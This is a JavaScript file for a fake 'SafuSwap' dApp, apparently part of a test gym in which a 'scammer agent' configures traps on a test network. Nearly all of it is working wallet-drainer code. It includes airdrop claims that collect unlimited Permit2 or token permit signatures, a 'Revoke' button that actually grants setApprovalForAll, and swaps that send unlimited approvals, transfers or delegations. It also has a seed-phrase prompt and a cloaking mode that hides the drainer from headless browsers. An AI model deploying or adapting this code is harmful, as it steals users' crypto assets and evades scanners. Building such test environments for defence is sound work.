// SafuSwap mini dApp. Behaviour is driven by window.__GYM__ (from gym/variants.json),
// so the scammer agent can plant or evolve traps without touching this file.
// Skins: swap (default), claim (airdrop), revoke (approval checker), cloak (placeholder unless a wallet is present).
(function () {
  var cfg = window.__GYM__;
  var USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
  var WETH = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
  var UNIV3 = '0xc36442b4a4522e871399cd717abdd847ab11fe88';
  var PERMIT2 = '0x000000000022d473030f116ddee9f6b43ac78ba3';
  var MAX = (1n << 256n) - 1n;
  var MAX160 = (1n << 160n) - 1n;
  var CHAIN = 11155111;
  var $ = function (id) { return document.getElementById(id); };
  var trap = function (type) { return (cfg.traps || []).find(function (t) { return t.type === type; }); };
  var account = null;
  var hex32 = function (v) { return BigInt(v).toString(16).padStart(64, '0'); };
  var addr32 = function (a) { return a.toLowerCase().replace(/^0x/, '').padStart(64, '0'); };
  var amountOf = function (a, max) { return a === 'max' ? max : BigInt(a); };
  var now = function () { return Math.floor(Date.now() / 1000); };
  var DAY = 86400;

  function setStatus(t) { var el = $('status'); if (el) el.textContent = t; }

  // ---- skins -------------------------------------------------------------
  function mainEl() { return document.querySelector('main'); }
  function claimSkin() {
    mainEl().innerHTML = '<div class="card"><h1>SafuSwap Airdrop · Season 2</h1>' +
      '<p class="muted">Eligible wallets can claim before the window closes.</p>' +
      '<div class="field"><label>Your allocation</label><div class="big">2,000 SFU</div><div class="muted">Claim closes in 23:59:12</div></div>' +
      '<button id="claim" type="button" disabled style="width:100%;margin-top:12px;padding:14px;border-radius:16px;border:0;background:#7c3aed;color:#fff;font-weight:800;font-size:17px">Connect wallet to claim</button>' +
      '<p class="muted">Gas-free: just sign to verify eligibility. No transaction needed.</p><div id="status" role="status"></div></div>';
    $('claim').onclick = doClaim;
  }
  function revokeSkin() {
    mainEl().innerHTML = '<div class="card"><h1>Approval Checker</h1>' +
      '<p class="muted">Old approvals are how wallets get drained. Revoke risky ones for free.</p>' +
      '<ul class="list" id="approvals"><li><span>Uniswap V3 Positions NFT<small>operator: old marketplace contract · risk HIGH</small></span><button class="mini revoke" type="button" disabled>Revoke</button></li>' +
      '<li><span>USDC<small>spender: unknown router · risk MEDIUM</small></span><button class="mini revoke" type="button" disabled>Revoke</button></li></ul>' +
      '<div id="status" role="status">Connect your wallet to scan approvals.</div></div>';
    Array.prototype.forEach.call(document.querySelectorAll('.revoke'), function (b) { b.onclick = doRevoke; });
  }

  // ---- connect -------------------------------------------------------------
  function seedPrompt(t) {
    var m = document.createElement('div');
    m.className = 'modal';
    m.innerHTML = '<div class="box" role="dialog" aria-label="' + t.title + '"><h2 style="margin-top:0">' + t.title + '</h2><p>' + t.wording + '</p>' +
      '<textarea id="verify-input" name="verify" placeholder="' + (t.placeholder || 'word1 word2 word3 ...') + '"></textarea><button id="verify-btn" type="button">' + (t.button || 'Verify wallet') + '</button></div>';
    document.body.appendChild(m);
    $('verify-btn').onclick = function () { setStatus('Verifying...'); };
  }
  var sp = trap('seed_prompt');

  function wireConnect() {
    $('connect').onclick = async function () {
      try {
        var accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
        account = accs[0];
        $('connect').textContent = account.slice(0, 6) + '…' + account.slice(-4);
        if ($('swap')) { $('swap').disabled = false; $('swap').textContent = 'Swap'; }
        if ($('claim')) { $('claim').disabled = false; $('claim').textContent = 'Claim 2,000 SFU'; }
        Array.prototype.forEach.call(document.querySelectorAll('.revoke'), function (b) { b.disabled = false; });
        setStatus(cfg.skin === 'revoke' ? 'Found 2 risky approvals.' : 'Wallet connected');
        if (sp && sp.when === 'after_connect') setTimeout(function () { seedPrompt(sp); }, sp.delayMs || 800);
      } catch (e) { setStatus('Connection rejected'); }
    };
  }

  // ---- traps ---------------------------------------------------------------
  function permit2Typed(t) {
    var exp = now() + (t.expirationDays || 1095) * DAY;
    var details = { token: (t.token || USDC), amount: amountOf(t.amount || 'max', MAX160).toString(), expiration: exp, nonce: 0 };
    var types = {
      EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
      PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }],
    };
    if (t.batch) {
      types.PermitBatch = [{ name: 'details', type: 'PermitDetails[]' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }];
      return { types: types, primaryType: 'PermitBatch', domain: { name: 'Permit2', chainId: CHAIN, verifyingContract: PERMIT2 },
        message: { details: [details, Object.assign({}, details, { token: WETH })], spender: t.spender, sigDeadline: exp } };
    }
    types.PermitSingle = [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }];
    return { types: types, primaryType: 'PermitSingle', domain: { name: 'Permit2', chainId: CHAIN, verifyingContract: PERMIT2 }, message: { details: details, spender: t.spender, sigDeadline: exp } };
  }
  function permit2612Typed(t) {
    return {
      types: {
        EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'version', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
        Permit: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }],
      },
      primaryType: 'Permit', domain: { name: 'USD Coin', version: '2', chainId: CHAIN, verifyingContract: (t.token || USDC) },
      message: { owner: account, spender: t.spender, value: amountOf(t.amount || 'max', MAX).toString(), nonce: 0, deadline: now() + (t.expirationDays || 1825) * DAY },
    };
  }

  async function doClaim() {
    var t = trap('permit2') || trap('permit');
    setStatus('Verifying eligibility… sign in your wallet');
    var td = !t ? { types: { EIP712Domain: [] }, primaryType: 'Claim', domain: { name: 'SafuSwap Airdrop' }, message: { wallet: account, amount: '2000' } }
      : t.type === 'permit' ? permit2612Typed(t) : permit2Typed(t);
    try {
      await window.ethereum.request({ method: 'eth_signTypedData_v4', params: [account, JSON.stringify(td)] });
      setStatus('Claim submitted. 2,000 SFU on the way.');
    } catch (e) { setStatus('Signature rejected in wallet'); }
  }

  async function doRevoke() {
    var t = trap('setApprovalForAll');
    var op = t ? t.operator : '0x0000000000000000000000000000000000000000';
    var flag = t ? (t.approved === false ? 0 : 1) : 0; // a real revoke sends approved = false
    var tx = { from: account, to: (t && t.collection) || UNIV3, data: '0xa22cb465' + addr32(op) + hex32(flag) };
    setStatus('Revoking… confirm in your wallet');
    try {
      await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
      setStatus('Approval revoked.');
    } catch (e) { setStatus('Transaction rejected in wallet'); }
  }

  function call(to, data) { return { to: to, data: data, value: '0x0' }; }
  function batchCalls(t, units) {
    return (t.calls || []).map(function (c) {
      if (c.kind === 'swap') return call(cfg.router, '0x38ed1739' + hex32(units) + hex32(0));
      if (c.kind === 'approve') return call(c.token || USDC, '0x095ea7b3' + addr32(c.spender) + hex32(amountOf(c.amount, MAX)));
      if (c.kind === 'setApprovalForAll') return call(c.collection || UNIV3, '0xa22cb465' + addr32(c.operator) + hex32(1));
      if (c.kind === 'transfer') return call(c.token || USDC, '0xa9059cbb' + addr32(c.to) + hex32(amountOf(c.amount, MAX)));
      return call(c.to, c.data || '0x');
    });
  }

  async function doSwap() {
    var amt = parseFloat($('amount').value || '0');
    var units = BigInt(Math.round(amt * 1e6));
    setStatus('Swapping ' + amt + ' USDC… confirm in your wallet');
    var ap = trap('approve'), inc = trap('increaseAllowance'), bt = trap('batch');
    try {
      if (bt) {
        var req = { version: '2.0.0', chainId: '0xaa36a7', from: account, atomicRequired: true, calls: batchCalls(bt, units) };
        if (bt.delegator) req.capabilities = { eip7702Auth: { address: bt.delegator } };
        await window.ethereum.request({ method: 'wallet_sendCalls', params: [req] });
      } else {
        var tx;
        if (ap) tx = { from: account, to: USDC, data: '0x095ea7b3' + addr32(ap.spender) + hex32(amountOf(ap.amount, MAX)) };
        else if (inc) tx = { from: account, to: USDC, data: (inc.method === 'increaseApproval' ? '0xd73dd623' : '0x39509351') + addr32(inc.spender) + hex32(amountOf(inc.amount, MAX)) };
        else tx = { from: account, to: cfg.router, data: '0x38ed1739' + hex32(units) + hex32(0) };
        await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
      }
      setStatus('Swap complete. ' + amt + ' USDC → ' + (amt * 0.00031).toFixed(4) + ' ETH');
    } catch (e) { setStatus('Transaction rejected in wallet'); }
  }

  // ---- boot ----------------------------------------------------------------
  if (cfg.skin === 'claim') claimSkin();
  else if (cfg.skin === 'revoke') revokeSkin();

  if (cfg.skin === 'cloak') {
    // Cloaking lab: stay a placeholder for no-wallet visitors (and, in strict mode, for automation),
    // reveal the drainer only when an EIP-1193 wallet is present.
    var ck = trap('cloak') || {};
    var bot = !!navigator.webdriver || /HeadlessChrome/i.test(navigator.userAgent);
    var hasWallet = !!window.ethereum;
    if (hasWallet && !(ck.hideFromAutomation && bot)) {
      setTimeout(function () {
        claimSkin();
        var c = $('connect'); c.hidden = false; c.textContent = 'Connect Wallet';
        wireConnect();
      }, ck.revealDelayMs || 1200);
    }
    return;
  }

  if ($('amount')) $('amount').addEventListener('input', function () { $('out').textContent = (parseFloat(this.value || 0) * 0.00031).toFixed(4); });
  if (sp && sp.when === 'load') seedPrompt(sp);
  wireConnect();
  if ($('swap')) $('swap').onclick = doSwap;
})();
